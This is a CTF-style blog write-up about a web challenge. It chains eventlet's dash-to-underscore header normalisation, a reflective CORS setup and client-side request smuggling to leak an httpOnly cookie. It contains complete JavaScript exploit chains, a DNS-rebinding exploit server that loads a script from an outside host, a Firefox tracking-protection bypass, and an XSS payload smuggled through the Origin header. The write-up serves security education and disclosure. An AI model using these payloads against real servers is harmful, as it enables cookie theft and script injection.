---
source: kevin-mizu
source_url: https://mizu.re/post/twitter-eventlet-csd
title: "Twitter challenge | Eventlet Client Side Desync | mizu.re"
description: "Twitter challenge | Eventlet Client Side Desync"
---

_keyboard\_arrow\_up_

title: Twitter challenge \| Eventlet Client Side Desync

date: May 22, 2024

tags: [Writeup](https://mizu.re/tag/Writeup) [Twitter](https://mizu.re/tag/Twitter) [Web](https://mizu.re/tag/Web) [Request\_Smuggling](https://mizu.re/tag/Request_Smuggling)

# Twitter challenge \| Eventlet Client Side Desync

![](https://mizu.re/articles/writeups/twitter/eventlet-csd/images/tweet.png)
( [Link](https://x.com/kevin_mizu/status/1790035413685391775))

* * *

## Table of content

- [🕵️ Recon](https://mizu.re/post/twitter-eventlet-csd#recon)
- [👀 \- to \_ Normalisation](https://mizu.re/post/twitter-eventlet-csd#normalisation)
- [🪟 Client-Side Desync](https://mizu.re/post/twitter-eventlet-csd#client-side-desync)
- [🍪 Browser's tracking protections](https://mizu.re/post/twitter-eventlet-csd#browsers-tracking-protections)
- [💥 TL/DR: Chain everything together](https://mizu.re/post/twitter-eventlet-csd#chain)
- [🤯 Unintended solutions](https://mizu.re/post/twitter-eventlet-csd#unintended-solution)
  - [DNS rebinding \| @frevadiscor89](https://mizu.re/post/twitter-eventlet-csd#unintended-frevadiscor89)
  - [Firefox only XSS (What?!) \| @taramtrampam](https://mizu.re/post/twitter-eventlet-csd#unintended-taramtrampam)
- [🔥 Solvers](https://mizu.re/post/twitter-eventlet-csd#solvers)

## 🕵️ Recon

This challenge consisted of only one endpoint with a very permissive CORS configuration:

- /src/app.py:

```py
from flask import Flask, request, jsonify
from eventlet import wsgi, listen

app = Flask(__name__)

@app.route("/", methods=["OPTIONS", "POST", "GET"])
def index():
    res = jsonify({ "data": request.get_data().decode() })
    res.headers["Set-Cookie"] = "flag=FLAG{Congratz_:)}; httpOnly=True"
    res.headers["Access-Control-Allow-Origin"] = request.headers.get("Origin")
    res.headers["Access-Control-Allow-Headers"] = request.headers.get("Access-Control-Request-Headers")
    res.headers["Access-Control-Allow-Credentials"] = "true"
    return res

wsgi.server(listen(("0.0.0.0", 33333)), app)
```

As we can see, it will:

- Reflect the Origin header in the Access-Control-Allow-Origin header.
- Reflect the Access-Control-Request-Headers header in the Access-Control-Allow-Headers header.
- Set Access-Control-Allow-Credentials to True.

This might looks weird at the first place, but it is quite common configuration for sharing harmless data cross sites using CORS.

Additionally, thanks to the provided sources, it was possible to see that the eventlet version was pinned to 0.35.1:

- /src/requirements.txt:

```
Flask
eventlet==0.35.1
flask_cors
```

The final goal was to find a way to pop an alert the flag cookie, which has an httpOnly=True attribute.

## 👀 \- to \_ Normalisation

At first glance, the challenge might look like a CORS challenge since it is the only misconfiguration present in the source code. Therefore, it is important not to forget the pinned eventlet version in the requirements.txt file.

By taking a look at the eventlet repository, it was possible to find the following PR I made a few days ago:

- drop header keys with underscores [#959](https://github.com/eventlet/eventlet/pull/959)

![pr.png](https://mizu.re/articles/writeups/twitter/eventlet-csd/images/pr.png)

This PR aims to block the blocks headers key which contains an \_ in incoming requests.

> Why block those headers?

This is because eventlet was normalizing - to \_ and using .upper() on each header key before using it:

- eventlet \> /eventlet/wsgi.py ( [permalink](https://github.com/eventlet/eventlet/blob/ec6c0fffccc129bea468a5badb03034d83f8cc5e/eventlet/wsgi.py#L767))

```python
for k, v in headers_raw:
    k = k.replace('-', '_').upper()
    if k in ('CONTENT_TYPE', 'CONTENT_LENGTH'):
        continue
    envk = 'HTTP_' + k
    if envk in env:
        env[envk] += ',' + v
    else:
        env[envk] = v
```

Due to this, it was possible to reach the server using CONTENT\_LENGTH instead of Content-Length, which could lead to request smuggling depending on the infrastructure.

Great research has already been conducted on the subject by [@DTCERT](https://x.com/DTCERT): [research article](https://github.security.telekom.com/2020/05/smuggling-http-headers-through-reverse-proxies.html).

> Why do WSGI servers do this?

This comes from an old notation that inherite the global variables typo in low-level languages. It was used as a way to normalize the current request environments, which are designed to give context about the current execution request.

This normalization is quite common in Python WSGI; most of them do this:

- Werkzeug: [permalink](https://github.com/pallets/werkzeug/blob/9fd8f5dcd4e4496a3a0bcc7785d2da0a7e07e000/src/werkzeug/serving.py#L205).
- Eventlet: [permalink](https://github.com/eventlet/eventlet/blob/ec6c0fffccc129bea468a5badb03034d83f8cc5e/eventlet/wsgi.py#L724).
- Django: [permalink](https://github.com/django/django/blob/b7c7209c67f742eda8184c46f139e0e1cb16a1f4/django/http/request.py#L456).
- uWSGI: [permalink](https://github.com/unbit/uwsgi/blob/26ee7c01b8bb65d5368670febf288e848364f4d9/contrib/uwsgi.java#L159).
- web.py: [permalink](https://github.com/webpy/webpy/blob/952d1fda12ac7ecdc47f2242c467f5e2734238d6/web/httpserver.py#L64).
- ...

Some \_ character limitations in header keys advisory can be found here:

- Nginx: [link](http://nginx.org/en/docs/http/ngx_http_core_module.html#underscores_in_headers).
- Django: [link](https://www.djangoproject.com/weblog/2015/jan/13/security/).
- Gunicorn: [link](https://github.com/benoitc/gunicorn/commit/72b8970dbf2bf3444eb2e8b12aeff1a3d5922a9a).
- Werkzeug: [link](https://github.com/pallets/werkzeug/commit/5ee439a692dc4474e0311de2496b567eed2d02cf).

## 🪟 Client-Side Desync

At this point, we know that the challenge's eventlet version allows the usage of \_ instead of - within headers.

> How could this be leveraged to leak an HTTPOnly cookie?

To answer this question, we need to take a look at the WhatWG fetch spec: ( [ref](https://fetch.spec.whatwg.org/#forbidden-header-name))

![whatwg.png](https://mizu.re/articles/writeups/twitter/eventlet-csd/images/whatwg.png)

As we can see, the Transfer-Encoding header is forbidden by default, mostly to avoid request smuggling from the client side. Therefore, thanks to the CORS configuration and the eventlet normalization, it is possible to use the Transfer\_Encoding header instead 👀

```js
fetch("http://challenges.mizu.re:33333/", {
    method: "POST",
    headers: { "Transfer_Encoding": "chunked" },
    body: "0\r\n\r\nGET /smug:) HTTP/1.1\r\n\r\n",
    credentials: "include"
})
```

![smug.png](https://mizu.re/articles/writeups/twitter/eventlet-csd/images/smug.png)

A good aspect of this configuration is that, thanks to CORS and the reflection of the body data, it is simple to manipulate the browser request using basic CSD techniques!

```js
const ORIGIN = location.origin === "file://" ? "null" : location.origin;
const TARGET = "http://challenges.mizu.re:33333/";

fetch(TARGET, {
    method: "POST",
    headers: { "Transfer_Encoding": "chunked" },
    body: `0\r\n\r\nPOST / HTTP/1.1\r\nOrigin: ${ORIGIN}\r\nContent-Length: 1000\r\n\r\n`,
    credentials: "include"
}).then(() => {
    setTimeout(() => {
        fetch(TARGET, {
            method: "POST",
            credentials: "include",
            body: "A".repeat(1000)
        }).then(d => d.text()).then((d) => {
            alert(d);
        });
    }, 500)
});
```

![csd_01.png](https://mizu.re/articles/writeups/twitter/eventlet-csd/images/csd_01.png)

_More references about such exploitation can be found [here](https://mizu.re/post/abusing-client-side-desync-on-werkzeug)._

## 🍪 Browser's tracking protections

At this point, you might think that the challenge is finished, however, it is not :p

If you take a closer look at the previous screenshot, you should notice that the Cookie header isn't present within the alert popup 😔

> Why is the cookie not included when CORS allows it?

This is due to the recent browser tracking policy updates:

- Chromium: [Privacy Sandbox Tracking Protection](https://blog.google/products/chrome/privacy-sandbox-tracking-protection/).
- Firefox: [Enhanced Tracking Protection](https://support.mozilla.org/en-US/kb/enhanced-tracking-protection-firefox-desktop#w_what-enhanced-tracking-protection-blocks).
- Safari: [Intelligent Tracking Prevention](https://webkit.org/blog/9521/intelligent-tracking-prevention-2-3/).

In Firefox, this protection can be easily bypassed by opening the page before fetching it. By doing so, the current website will be whitelisted for 30 days ( [documentation](https://developer.mozilla.org/en-US/docs/Web/Privacy/State_Partitioning#opener_heuristics)).

![ff_tracking.png](https://mizu.re/articles/writeups/twitter/eventlet-csd/images/ff_tracking.png)

_Great researches has been made on the subject by [@ptswarm](https://x.com/ptswarm): [research article](https://swarm.ptsecurity.com/bypassing-browser-tracking-protection-for-cors-misconfiguration-abuse/)._

The complication arises when we want to retrieve the cookie on Chromium-based browsers. To be honest, when posting the challenge, I had only solved it on Firefox and thought it would be impossible on Chromium (spoiler: I was wrong, see the [unintended solution](https://mizu.re/post/twitter-eventlet-csd#unintended-solution) section).

## 💥 TL/DR: Chain everything together

- Eventlet normalizes - to \_ in header keys.
- The Fetch spec blocks Transfer-Encoding but not Transfer\_Encoding.
- Bypass tracking policy on Firefox using open().

```js
const ORIGIN = location.origin === "file://" ? "null" : location.origin;
const TARGET = "http://challenges.mizu.re:33333/";

open(TARGET);
fetch(TARGET, {
    method: "POST",
    headers: { "Transfer_Encoding": "chunked" },
    body: `0\r\n\r\nPOST / HTTP/1.1\r\nOrigin: ${ORIGIN}\r\nContent-Length: 1000\r\n\r\n`,
    credentials: "include"
}).then(() => {
    setTimeout(() => {
        fetch(TARGET, {
            method: "POST",
            credentials: "include",
            body: "A".repeat(1000)
        }).then(d => d.text()).then((d) => {
            alert(d);
        });
    }, 500)
});
```

![solution_01.png](https://mizu.re/articles/writeups/twitter/eventlet-csd/images/solution_01.png)

## 🤯 Unintended solutions

### DNS rebinding \| [@frevadiscor89](https://x.com/frevadiscor89)

This solution, found by [@frevadiscor89](https://x.com/frevadiscor89), uses the fact that DNS rebinding is possible from the browser side. This is quite useful in the challenge context as the Set-Cookie header, which contains the flag, will be set regardless of the domain used to reach the web server.

Thus, using DNS rebinding, it is possible to have the same origin as the challenge, which isn't limited by the tracking protection. From here, simply reproducing the bug explained before allows the flag to be leaked 🔥

_It was also possible to retrieve the cookie server-side by using DNS rebinding one more time._

```py
from flask import Flask, request, abort

app = Flask(__name__)
post_request_count = 0

@app.route('/exploit')
def send_auto_post():
    return '''
<html>
<body>
    <script>
        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * charactersLength));
            }
            return result;
        }

        const host = "http://double.fr3v4.org:33333/";
        let count = 0;
        let maxTries = 5;

        function dns_rebind() {
            if (count < maxTries) {
                fetch(`${host}count?rand=` + makeid(4), {mode: 'no-cors', keepalive: false})
                    .then(response => {
                        if (response.status === 200) {
                            response.text().then(text => {
                                perform_csd();
                            });
                        } else {
                            throw new Error('Status not 200');
                        }
                    })
                    .catch(() => {
                        count++;
                        setTimeout(dns_rebind, 10);
                    });
            } else {
                perform_csd();
            }
        }

        function perform_csd() {
            const script1 = document.createElement('script');
            script1.src = 'https://VPS/csd.js';
            script1.onload = () => fetchData();
            document.body.appendChild(script1);
        }
       dns_rebind();
    </script>
</body>
</html>'''

@app.route('/count')
def handle_posts():
    global post_request_count
    post_request_count += 1
    if post_request_count >= 4:
        shutdown_server()
    return abort(404)

def shutdown_server():
    func = request.environ.get('werkzeug.server.shutdown')
    if func is None:
        raise RuntimeError('Not running with the Werkzeug Server')
    func()

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=33333)
```

### Firefox only XSS (What?!) \| [@taramtrampam](https://x.com/taramtrampam)

This solution, found by [@taramtrampam](https://x.com/taramtrampam), uses the fact that a HEAD response has a Content-Length header without any body: ( [RFC 7231](https://datatracker.ietf.org/doc/html/rfc7231#section-4.3.2))

![head_01.png](https://mizu.re/articles/writeups/twitter/eventlet-csd/images/head_01.png)

_This is something that has been highlighted by [@tincho\_508](https://x.com/tincho_508) in his request smuggling [research article](https://portswigger.net/research/trace-desync-attack)._

In the challenge context:

![head_02.png](https://mizu.re/articles/writeups/twitter/eventlet-csd/images/head_02.png)

> How this can be leveraged?

By smuggling a HEAD request, it is possible to force the browser to read more than expected on the next request. Using the Origin header reflection and forcing the request to be an iframe one leads to triggering an XSS on the [http://challenges.mizu.re:33333/](http://challenges.mizu.re:33333/) domain on a page that contains the cookie 🔥

![head_03.png](https://mizu.re/articles/writeups/twitter/eventlet-csd/images/head_03.png)

As we can see, because the browser has no idea it is receiving a HEAD response, it will read the TCP stream according to the Content-Length header in the HEAD response. Since this is done on a 404 error page, the Content-Type is text/html, leading to an XSS via the origin header reflection :)

_This won't work on Chromium-based browsers since they have request splitting protection._

```html
<!DOCTYPE html>
<iframe id="ttt" name="ttt-name"></iframe>

<script>
const body = `0

HEAD /aaa HTTP/1.1
Connection: keep-alive
Transfer_Encoding: chunked

0

GET / HTTP/1.1
Origin: <script>eval(location.hash.slice(1))<\/script>

`.replaceAll('\n', '\r\n');

const test = () => {
    fetch('http://challenges.mizu.re:33333/', {
        method: "POST",
        headers: {
            "Transfer_Encoding": "chunked",
        },
        credentials: 'include',
        mode: 'cors',
        body
    }).then((q) => {
        return q.text();
    }).then((data) => {
        console.log(data);
        ttt.src = 'http://challenges.mizu.re:33333/?4#alert(document.body.innerText.match(/FLAG\{.*\}/))';
    });
}

test();
</script>
```

![xss.png](https://mizu.re/articles/writeups/twitter/eventlet-csd/images/xss.png)

## 🔥 Solvers

- [@Alex\_ctf\_](https://x.com/Alex_ctf_) 🏆
- [@Satoooon1024](https://x.com/Satoooon1024) 🥈
- [@hulitw](https://x.com/hulitw) and [@BrunoModificato](https://x.com/BrunoModificato) 🥉
- [@BitK\_](https://x.com/BitK_)
- [@frevadiscor89](https://x.com/frevadiscor89)
- [@parrot409](https://x.com/parrot409)
- [@ldionmarcil](https://x.com/ldionmarcil)
- [@sudhanshur705](https://x.com/sudhanshur705)
- [@taramtrampam](https://x.com/taramtrampam)

[_keyboard\_arrow\_left_ HeroCTF v6 Writeups](https://mizu.re/post/heroctf-v6-writeups)

[Twisty Python _keyboard\_arrow\_right_](https://mizu.re/post/twisty-python)